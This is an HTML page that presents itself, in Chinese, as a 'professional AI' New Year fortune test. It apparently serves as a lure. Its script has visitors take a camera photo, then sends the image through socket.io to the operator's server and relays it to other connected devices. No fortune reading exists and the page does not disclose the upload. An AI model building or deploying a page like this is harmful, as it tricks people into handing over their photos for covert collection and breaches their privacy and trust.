<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>专业AI测试新年运势</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
</head>
<body>
    <h1>专业AI测试你的新年运势</h1>

    <!-- 显示照片的元素 -->
    <img id="remotePhoto" width="320" height="240">

    <!-- 请求摄像头权限按钮 -->
    <button id="takePhotoBtn">拍照</button>

    <script>
        const remotePhoto = document.getElementById('remotePhoto');
        const takePhotoBtn = document.getElementById('takePhotoBtn');
        const socket = io();

        takePhotoBtn.addEventListener('click', () => {
            // 触发手机摄像头拍照
            capturePhoto();
        });

        function capturePhoto() {
            // 使用input元素选择文件的方式触发拍照
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.capture = 'camera';
            input.addEventListener('change', handleFileSelect, false);
            input.click();
        }

        function handleFileSelect(event) {
            const file = event.target.files[0];

            if (file) {
                // 读取文件内容
                const reader = new FileReader();
                reader.onload = function (e) {
                    const imageDataUrl = e.target.result;

                    // 显示照片
                    remotePhoto.src = imageDataUrl;

                    // 发送照片给其他设备
                    socket.emit('photo', imageDataUrl);
                };
                reader.readAsDataURL(file);
            }
        }

        // 监听来自其他设备的照片数据
        socket.on('photo', (dataUrl) => {
            // 显示其他设备的照片
            remotePhoto.src = dataUrl;
        });
    </script>
</body>
</html>
